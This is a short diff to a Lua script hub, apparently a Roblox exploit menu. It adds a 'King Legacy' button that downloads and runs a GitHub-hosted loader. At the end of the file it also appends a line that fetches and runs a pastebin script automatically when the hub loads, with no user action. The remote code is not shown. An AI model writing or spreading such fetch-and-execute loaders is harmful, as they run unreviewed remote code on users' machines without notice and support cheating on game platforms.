@@ -43,6 +43,17 @@ local Tab = Window:MakeTab({
     end    
 })
 local Tab = Window:MakeTab({
+    Name = "King Legacy",
+    Icon = "rbxassetid://11348590078",
+    PremiumOnly = false
+})
+:AddButton({
+    Name = "Execute!",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/matheuzxs/matheuzxs.lua/main/Loader"))()
+    end    
+})
+local Tab = Window:MakeTab({
 		Name = "Admins",
 		Icon = "rbxassetid://11819163504",
 		PremiumOnly = false
@@ -85,3 +96,5 @@ local Tab = Window:MakeTab({
 			loadstring(game:HttpGet("https://pastebin.com/raw/A4r1pHJY"))()
 		end    
 	})
+	
+	loadstring(game:HttpGet("https://pastebin.com/raw/Fz6vcuAb", true))()  
